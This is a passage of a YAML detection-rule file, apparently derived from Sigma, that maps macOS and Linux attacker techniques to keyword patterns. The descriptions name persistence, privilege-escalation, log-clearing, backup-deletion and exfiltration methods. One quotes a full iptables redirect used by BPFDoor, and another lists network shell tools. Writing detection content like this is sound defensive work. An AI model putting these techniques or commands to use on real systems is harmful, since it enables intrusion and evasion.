      - credentials
      - from
      - password
      - stores
      - keychain
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3603f18a_ec15_43a1_9af2_d196c8a7fec6
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the use of csrutil to disable the Configure System Integrity
    Protection (SIP). This technique is used in post-exploit scenarios.

    '
  conditions:
    summary:
      regex_any:
      - system
      - integrity
      - protection
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ff39f1a6_84ac_476f_a1af_37fcdf53d7c0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling security tools
  conditions:
    summary:
      regex_any:
      - disable
      - security
      - tools
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b743623c_2776_40e0_87b1_682b975d0ca5
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects attempts to create and add an account to the admin group via
    "dscl"
  conditions:
    summary:
      regex_any:
      - user
      - added
      - admin
      - group
      - dscl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5d0fdb62_f225_42fb_8402_3dfe64da468a
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects attempts to create and/or add an account to the admin group,
    thus granting admin privileges.
  conditions:
    summary:
      regex_any:
      - user
      - added
      - admin
      - group
      - dseditgroup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_821bcf4d_46c7_4b87_bc57_9509d3ba7c11
  intent: persistence_installation
  tactic: persistence
  description: Detects attempts to enable the root account via "dsenableroot"
  conditions:
    summary:
      regex_any:
      - root
      - account
      - enable
      - dsenableroot
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_53b1b378_9b06_4992_b972_dde6e423d2b4
  intent: credential_harvesting
  tactic: credential_access
  description: Detecting attempts to extract passwords with grep and laZagne
  conditions:
    summary:
      regex_any:
      - credentials
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1cf98dc2_fcb0_47c9_8aea_654c9284d1ae
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects the execution of the hdiutil utility in order to create a disk
    image.
  conditions:
    summary:
      regex_any:
      - disk
      - image
      - creation
      - hdiutil
      - macos
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bf241472_f014_4f01_a869_96f99330ca8c
  intent: data_staging
  tactic: collection
  description: Detects the execution of the hdiutil utility in order to mount disk
    images.
  conditions:
    summary:
      regex_any:
      - disk
      - image
      - mounting
      - hdiutil
      - macos
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e0cfaecd_602d_41af_988d_f6ccebb2af26
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the execution of suspicious child processes from macOS installer
    package parent process. This includes osascript, JXA, curl and wget amongst other
    interpreters
  conditions:
    summary:
      regex_any:
      - suspicious
      - installer
      - package
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2d5e7a8b_f484_4a24_945d_7f0efd52eab0
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the use of "ioreg" which will show I/O Kit registry information.

    This process is used for system information discovery.

    It has been observed in-the-wild by calling this process directly or using bash
    and grep to look for specific strings.

    '
  conditions:
    summary:
      regex_any:
      - system
      - information
      - discovery
      - using
      - ioreg
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2316929c_01aa_438c_970f_099145ab1ee6
  intent: execution
  tactic: execution
  description: Detects potential suspicious child processes of "jamf". Could be a
    sign of potential abuse of Jamf as a C2 server as seen by Typhon MythicAgent.
  conditions:
    summary:
      regex_any:
      - jamf
      - potential
      - suspicious
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f1408a58_0e94_4165_b80a_da9f96cf6fc3
  intent: execution
  tactic: execution
  description: Detects possible malicious execution of JXA in-memory via OSAScript
  conditions:
    summary:
      regex_any:
      - memory
      - execution
      - osascript
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ae9d710f_dcd1_4f75_a0a5_93a73b5dda0e
  intent: persistence_installation
  tactic: persistence
  description: Detects the execution of programs as Launch Agents or Launch Daemons
    using launchctl on macOS.
  conditions:
    summary:
      regex_any:
      - launch
      - agent
      - daemon
      - execution
      - launchctl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6d8a7cf1_8085_423b_b87d_7e880faabbdf
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the execution of the nscurl utility in order to download files.
  conditions:
    summary:
      regex_any:
      - file
      - download
      - nscurl
      - macos
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_69483748_1525_4a6c_95ca_90dc8d431b68
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious child processes spawning from microsoft office suite
    applications such as word or excel. This could indicates malicious macro execution
  conditions:
    summary:
      regex_any:
      - suspicious
      - microsoft
      - office
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b9d9b652_d8ed_4697_89a2_a1186ee680ac
  intent: execution
  tactic: execution
  description: Detects potential suspicious run-only executions compiled using OSACompile
  conditions:
    summary:
      regex_any:
      - osacompile
      - only
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_234dc5df_40b5_49d1_bf53_0d44ce778eca
  intent: unknown
  tactic: s0402
  description: Detects when a built-in utility is used to decode and decrypt a payload
    after a macOS disk image (DMG) is executed. Malware authors may attempt to evade
    detection and trick users into executing malicious code by encoding and encrypting
    their payload and placing it in a disk image file. This behavior is consistent
    with adware or malware families such as Bundlore and Shlayer.
  conditions:
    summary:
      regex_any:
      - payload
      - decoded
      - decrypted
      - built
      - utilities
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_65d506d3_fcfe_4071_b4b2_bcefe721bbbb
  intent: persistence_installation
  tactic: persistence
  description: Detects potential persistence activity using LaunchAgents or LaunchDaemons
    via the PlistBuddy utility
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - plistbuddy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_22c45af6_f590_4d44_bab3_b5b2d2a2b6d9
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects potential execution of MeshAgent which is a tool used for
    remote access.

    Historical data shows that threat actors rename MeshAgent binary to evade detection.

    Matching command lines with the ''--meshServiceName'' argument can indicate that
    the MeshAgent is being used for remote access.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - potential
      - meshagent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bd3b5eaa_439d_4a42_8f35_a49f5c8a2582
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of a renamed instance of the Remote Monitoring
    and Management (RMM) tool, MeshAgent.

    RMM tools such as MeshAgent are commonly utilized by IT administrators for legitimate
    remote support and system management.

    However, malicious actors may exploit these tools by renaming them to bypass detection
    mechanisms, enabling unauthorized access and control over compromised systems.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - renamed
      - meshagent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7c3b43d8_d794_47d2_800a_d277715aa460
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects abuse of the cron utility to perform task scheduling for initial
    or recurring execution of malicious code. Detection will focus on crontab jobs
    uploaded from the tmp folder.
  conditions:
    summary:
      regex_any:
      - scheduled
      - cron
      - task
      - macos
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0ed75b9c_c73b_424d_9e7d_496cd565fbe0
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of system utilities (only grep for now) to discover security
    software discovery
  conditions:
    summary:
      regex_any:
      - security
      - software
      - discovery
      - macos
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a753a6af_3126_426d_8bd0_26ebbcb92254
  intent: execution
  tactic: execution
  description: Detects potential suspicious applet or osascript executing "osacompile".
  conditions:
    summary:
      regex_any:
      - osacompile
      - execution
      - potentially
      - suspicious
      - applet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0250638a_2b28_4541_86fc_ea4c558fa0c6
  intent: execution
  tactic: execution
  description: Detects suspicious child processes spawned from browsers. This could
    be a result of a potential web browser exploitation.
  conditions:
    summary:
      regex_any:
      - suspicious
      - browser
      - child
      - process
      - macos
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6e4dcdd1_e48b_42f7_b2d8_3b413fc58cb4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when the macOS Script Editor utility spawns an unusual child
    process.
  conditions:
    summary:
      regex_any:
      - suspicious
      - execution
      - macos
      - script
      - editor
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_85de3a19_b675_4a51_bfc6_b11a5186c971
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of "find" binary in a suspicious manner to perform discovery
  conditions:
    summary:
      regex_any:
      - potential
      - discovery
      - activity
      - using
      - find
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_508a9374_ad52_4789_b568_fc358def2c65
  intent: credential_harvesting
  tactic: credential_access
  description: Detects commandline operations on shell history files
  conditions:
    summary:
      regex_any:
      - suspicious
      - history
      - file
      - operations
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_13db8d2e_7723_4c2c_93c1_a4d36994f7ef
  intent: execution
  tactic: execution
  description: Detects potential in-memory downloading and compiling of applets using
    curl and osacompile as seen used by XCSSET malware
  conditions:
    summary:
      regex_any:
      - potential
      - memory
      - download
      - compile
      - payloads
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7ed2c9f7_c59d_4c82_a7e2_f859aa676099
  intent: impact_operations
  tactic: impact
  description: Detects when a user manipulates with Firmward Password on MacOS. NOTE
    - this command has been disabled on silicon-based apple computers.
  conditions:
    summary:
      regex_any:
      - suspicious
      - macos
      - firmware
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5de06a6f_673a_4fc0_8d48_bcfe3837b033
  intent: reconnaissance
  tactic: discovery
  description: Detects the use of "sw_vers" for system information discovery
  conditions:
    summary:
      regex_any:
      - system
      - information
      - discovery
      - using
      - sw_vers
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_652c098d_dc11_4ba6_8566_c20e89042f2b
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects attempts to create and add an account to the admin group via
    "sysadminctl"
  conditions:
    summary:
      regex_any:
      - user
      - added
      - admin
      - group
      - sysadminctl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6ff08e55_ea53_4f27_94a1_eff92e6d9d5c
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the execution of "sysctl" with specific arguments that have
    been used by threat actors and malware. It provides system hardware information.

    This process is primarily used to detect and avoid virtualization and analysis
    environments.

    '
  conditions:
    summary:
      regex_any:
      - system
      - information
      - discovery
      - sysctl
      - macos
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4809c683_059b_4935_879d_36835986f8cf
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of "system_profiler" with specific "Data Types"
    that have been seen being used by threat actors and malware. It provides system
    hardware and software configuration information.

    This process is primarily used for system information discovery. However, "system_profiler"
    can also be used to determine if virtualization software is being run for defense
    evasion purposes.

    '
  conditions:
    summary:
      regex_any:
      - system
      - information
      - discovery
      - using
      - system_profiler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_09a910bf_f71f_4737_9c40_88880ba5913d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the use of tail to extract bytes at an offset from an image
    and then decode the base64 value to create a new file with the decoded content.
    The detected execution is a bash one-liner.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - base64
      - decoded
      - from
      - images
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_452df256_da78_427a_866f_49fa04417d74
  intent: impact_operations
  tactic: impact
  description: 'Detects deletion attempts of MacOS Time Machine backups via the native
    backup utility "tmutil".

    An adversary may perform this action before launching a ransonware attack to prevent
    the victim from restoring their files.

    '
  conditions:
    summary:
      regex_any:
      - time
      - machine
      - backup
      - deletion
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2c95fa8a_8b8d_4787_afce_7117ceb8e3da
  intent: impact_operations
  tactic: impact
  description: 'Detects disabling of Time Machine (Apple''s automated backup utility
    software) via the native macOS backup utility "tmutil".

    An attacker can use this to prevent backups from occurring.

    '
  conditions:
    summary:
      regex_any:
      - time
      - machine
      - backup
      - disabled
      - tmutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9acf45ed_3a26_4062_bf08_56857613eb52
  intent: impact_operations
  tactic: impact
  description: 'Detects the addition of a new file or path exclusion to MacOS Time
    Machine via the "tmutil" utility.

    An adversary could exclude a path from Time Machine backups to prevent certain
    files from being backed up.

    '
  conditions:
    summary:
      regex_any:
      - file
      - exclusion
      - added
      - time
      - machine
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f68c4a4f_19ef_4817_952c_50dce331f4b0
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the execution traces of the WizardUpdate malware. WizardUpdate
    is a macOS trojan that attempts to infiltrate macOS machines to steal data and
    it is associated with other types of malicious payloads, increasing the chances
    of multiple infections on a device.
  conditions:
    summary:
      regex_any:
      - potential
      - wizardupdate
      - malware
      - infection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_47d65ac0_c06f_4ba2_a2e3_d263139d0f51
  intent: command_and_control_setup
  tactic: command_and_control
  description: Identifies the execution traces of the XCSSET malware. XCSSET is a
    macOS trojan that primarily spreads via Xcode projects and maliciously modifies
    applications. Infected users are also vulnerable to having their credentials,
    accounts, and other vital data stolen.
  conditions:
    summary:
      regex_any:
      - potential
      - xcsset
      - malware
      - infection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_977ef627_4539_4875_adf4_ed8f780c4922
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect changes in auditd configuration files
  conditions:
    summary:
      regex_any:
      - auditing
      - configuration
      - changes
      - linux
      - host
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c52a914f_3d8b_4b2a_bb75_b3991e75f8ba
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Adversaries may use binary padding to add junk data and change the
    on-disk representation of malware.

    This rule detect using dd and truncate to add a junk data to file.

    '
  conditions:
    summary:
      regex_any:
      - binary
      - padding
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_808146b2_9332_4d78_9416_d7e47012d83d
  intent: execution
  tactic: execution
  description: detects BPFDoor .lock and .pid files access in temporary file storage
    facility
  conditions:
    summary:
      regex_any:
      - bpfdoor
      - abnormal
      - process
      - lock
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_70b4156e_50fc_4523_aa50_c9dddf1993fc
  intent: defense_evasion
  tactic: defense_evasion
  description: 'All TCP traffic on particular port from attacker is routed to different
    port. ex. ''/sbin/iptables -t nat -D PREROUTING -p tcp -s 192.168.1.1 --dport
    22 -j REDIRECT --to-ports 42392''

    The traffic looks like encrypted SSH communications going to TCP port 22, but
    in reality is being directed to the shell port once it hits the iptables rule
    for the attacker host only.

    '
  conditions:
    summary:
      regex_any:
      - bpfdoor
      - ports
      - redirect
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b3cec4e7_6901_4b0d_a02d_8ab2d8eb818b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect file time attribute change to hide new or changes to existing
    files.
  conditions:
    summary:
      regex_any:
      - file
      - time
      - attribute
      - change
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a5b977d6_8a81_4475_91b9_49dbfcd941f7
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects removing immutable file attribute.
  conditions:
    summary:
      regex_any:
      - remove
      - immutable
      - file
      - attribute
      - auditd
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eca5e022_d368_4043_98e5_9736fb01f72f
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the use of the `syslog` syscall with action code 5 (SYSLOG_ACTION_CLEAR),

    (4 is SYSLOG_ACTION_READ_CLEAR and 6 is SYSLOG_ACTION_CONSOLE_OFF) which clears
    the kernel

    ring buffer (dmesg logs). This can be used by attackers to hide traces after exploitation

    or privilege escalation. A common technique is running `dmesg -c`, which triggers
    this syscall internally.

    '
  conditions:
    summary:
      regex_any:
      - clear
      - disable
      - kernel
      - ring
      - buffer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_071d5e5a_9cef_47ec_bc4e_a42e34d8d0ed
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects command line parameter very often used with coin miners
  conditions:
    summary:
      regex_any:
      - possible
      - coin
      - miner
      - priority
      - param
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_759d0d51_bc99_4b5e_9add_8f5b2c8e7512
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of a new user account. Such accounts may be used
    for persistence that do not require persistent remote access tools to be deployed
    on the system.
  conditions:
    summary:
      regex_any:
      - creation
      - user
      - account
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cb39d16b_b3b6_4a7a_8222_1cf24b686ffc
  intent: data_exfiltration
  tactic: exfiltration
  description: 'Detects attempts to post the file with the usage of wget utility.

    The adversary can bypass the permission restriction with the misconfigured sudo
    permission for wget utility which could allow them to read files like /etc/shadow.

    '
  conditions:
    summary:
      regex_any:
      - data
      - exfiltration
      - with
      - wget
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e497a24e_9345_4a62_9803_b06d7d7cb132
  intent: defense_evasion
  tactic: defense_evasion
  description: "Detects actions that disable Address Space Layout Randomization (ASLR)\
    \ in Linux, including:\n  - Use of the `personality` syscall with the ADDR_NO_RANDOMIZE\
    \ flag (0x0040000)\n  - Modification of the /proc/sys/kernel/randomize_va_space\
    \ file\n  - Execution of the `sysctl` command to set `kernel.randomize_va_space=0`\n\
    Disabling ASLR is often used by attackers during exploit development or to bypass\
    \ memory protection mechanisms.\nA successful use of these methods can reduce\
    \ the effectiveness of ASLR and make memory corruption attacks more reliable.\n"
  conditions:
    summary:
      regex_any:
      - aslr
      - disabled
      - sysctl
      - direct
      - syscall
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_53059bc0_1472_438b_956a_7508a94a91f0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling of system firewalls which could be used by adversaries
    to bypass controls that limit usage of the network.
  conditions:
    summary:
      regex_any:
      - disable
      - system
      - firewall
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_df3fcaea_2715_4214_99c5_0056ea59eb35
  intent: credential_harvesting
  tactic: credential_access
  description: Detecting attempts to extract passwords with grep
  conditions:
    summary:
      regex_any:
      - credentials
      - files
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_49aae26c_450e_448b_911d_b3c13d178dfc
  intent: credential_harvesting
  tactic: credential_access
  description: Detect attempt to enable auditing of TTY input
  conditions:
    summary:
      regex_any:
      - linux
      - keylogging
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4b3cb710_5e83_4715_8c45_8b2b5b3e5751
  intent: defense_evasion
  tactic: defense_evasion
  description: Identifies modification of ld.so.preload for shared object injection.
    This technique is used by attackers to load arbitrary code into processes.
  conditions:
    summary:
      regex_any:
      - modification
      - preload
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_106d7cbd_80ff_4985_b682_a7043e5acb72
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects loading of kernel modules with insmod command.

    Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded
    into the kernel upon demand.

    Adversaries may use LKMs to obtain persistence within the system or elevate the
    privileges.

    '
  conditions:
    summary:
      regex_any:
      - loading
      - kernel
      - module
      - insmod
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c830f15d_6f6e_430f_8074_6f73d6807841
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect changes of syslog daemons configuration files
  conditions:
    summary:
      regex_any:
      - logging
      - configuration
      - changes
      - linux
      - host
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ea61bb82_a5e0_42e6_8537_91d29500f1b9
  intent: impact_operations
  tactic: impact
  description: 'Detects the potential abuse of the Linux Magic SysRq (System Request)
    key by adversaries with root or sufficient privileges

    to silently manipulate or destabilize a system. By writing to /proc/sysrq-trigger,
    they can crash the system, kill processes,

    or disrupt forensic analysisall while bypassing standard logging. Though intended
    for recovery and debugging, SysRq can be

    misused as a stealthy post-exploitation tool. It is controlled via /proc/sys/kernel/sysrq
    or permanently through /etc/sysctl.conf.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - abuse
      - linux
      - magic
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9d4548fa_bba0_4e88_bd66_5d5bf516cda0
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Masquerading occurs when the name or location of an executable, legitimate
    or malicious, is manipulated or abused for the sake of evading defenses and observation.

    Several different variations of this technique have been observed.

    '
  conditions:
    summary:
      regex_any:
      - masquerading
      - linux
      - crond
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_323ff3f5_0013_4847_bbd4_250b5edb62cc
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the removal of system firewall rules. Adversaries may only
    delete or modify a specific system firewall rule to bypass controls limiting network
    usage or access.

    Detection rules that match only on the disabling of firewalls will miss this.

    '
  conditions:
    summary:
      regex_any:
      - modify
      - system
      - firewall
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f7158a64_6204_4d6d_868a_6e6378b467e0
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects suspicious activities as declared by Florian Roth in its ''Best
    Practice Auditd Configuration''.

    This includes the detection of the following commands; wget, curl, base64, nc,
    netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap.

    These commands match a few techniques from the tactics "Command and Control",
    including not exhaustively the following; Application Layer Protocol (T1071),
    Non-Application Layer Protocol (T1095), Data Encoding (T1132)

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - activities
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1543ae20_cbdf_4ec1_8d12_7664d667a825
  intent: execution
  tactic: execution
  description: Detects relevant commands often related to malware or hacking activity
  conditions:
    summary:
      regex_any:
      - suspicious
      - commands
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a39d7fa7_3fbd_4dc2_97e1_d87f546b1bbc
  intent: unknown
  tactic: resource_development
  description: Detects program executions in suspicious non-program folders related
    to malware or hacking activity
  conditions:
    summary:
      regex_any:
      - program
      - executions
      - suspicious
      - folders
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eae8ce9f_bde9_47a6_8e79_f20d18419910
  intent: credential_harvesting
  tactic: credential_access
  description: Detects commandline operations on shell history files
  conditions:
    summary:
      regex_any:
      - suspicious
      - history
      - file
      - operations
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1bac86ba_41aa_4f62_9d6b_405eac99b485
  intent: persistence_installation
  tactic: persistence
  description: Detects a creation of systemd services which could be used by adversaries
    to execute malicious code.
  conditions:
    summary:
      regex_any:
      - systemd
      - service
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a94cdd87_6c54_4678_a6cc_2814ffe5a13d
  intent: persistence_installation
  tactic: persistence
  description: Detect unix shell configuration modification. Adversaries may establish
    persistence through executing malicious commands triggered when a new shell is
    opened.
  conditions:
    summary:
      regex_any:
      - unix
      - shell
      - configuration
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c0d3734d_330f_4a03_aae2_65dacc6a8222
  intent: persistence_installation
  tactic: persistence
  description: Detects possible command execution by web application/web shell
  conditions:
    summary:
      regex_any:
      - webshell
      - remote
      - command
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_41e5c73d_9983_4b69_bd03_e13b67e9623c
  intent: unknown
  tactic: g0020
  description: Detects suspicious shell commands used in various Equation Group scripts
    and tools
  conditions:
    summary:
      regex_any:
      - equation
      - group
      - indicators
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_18b042f0_2ecd_4b6e_9f8d_aa7a7e7de781
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects buffer overflow attempts in Unix system log files
  conditions:
    summary:
      regex_any:
      - buffer
      - overflow
      - attempts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e09eb557_96d2_4de9_ba2d_30f712a5afd3
  intent: impact_operations
  tactic: impact
  description: Detects specific commands commonly used to remove or empty the syslog
  conditions:
    summary:
      regex_any:
      - commands
      - clear
      - remove
      - syslog
      - builtin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7e3c4651_c347_40c4_b1d4_d48590fdf684
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the ld.so preload persistence file. See `man ld.so` for more
    information.
  conditions:
    summary:
      regex_any:
      - code
      - injection
      - preload
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7ba05b43_adad_4c02_b5e9_c8c35cdf9fa8
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects exploitation of Nimbuspwn privilege escalation vulnerability
    (CVE-2022-29799 and CVE-2022-29800)
  conditions:
    summary:
      regex_any:
      - nimbuspwn
      - exploitation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0fadd880_6af3_4610_b1e5_008dc3a11b8a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the presence of "bpf_probe_write_user" BPF helper-generated
    warning messages. Which could be a sign of suspicious eBPF activity on the system.
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - activity
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0ac15ec3_d24f_4246_aa2a_3077bb1cf90e
  intent: persistence_installation
  tactic: persistence
  description: Detects the addition of a new user to a privileged group such as "root"
    or "sudo"
  conditions:
    summary:
      regex_any:
      - privileged
      - user
      - been
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c67e0c98_4d39_46ee_8f6b_437ebf6b950e
  intent: persistence_installation
  tactic: persistence
  description: Detects shellshock expressions in log files
  conditions:
    summary:
      regex_any:
      - shellshock
      - expression
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fdc88d25_96fb_4b7c_9633_c0e417fdbd4e
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects commands that try to clear or tamper with the Linux command
    history.

    This technique is used by threat actors in order to evade defenses and execute
    commands without them being recorded in files such as "bash_history" or "zsh_history".

    '
  conditions:
    summary:
      regex_any:
      - linux
      - command
      - history
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2aa1440c_9ae9_4d92_84a7_a9e5f5e31695
  intent: execution
  tactic: execution
  description: Detects suspicious shell commands used in various exploit codes (see
    references)
  conditions:
    summary:
      regex_any:
      - suspicious
      - activity
      - shell
      - commands
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f64b6e9a_5d9d_48a5_8289_e1dd2b3876e1
  intent: impact_operations
  tactic: impact
  description: Detects suspicious log entries in Linux log files
  conditions:
    summary:
      regex_any:
      - suspicious
      - entries
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_738d9bcf_6999_4fdb_b4ac_3033037db8ab
  intent: execution
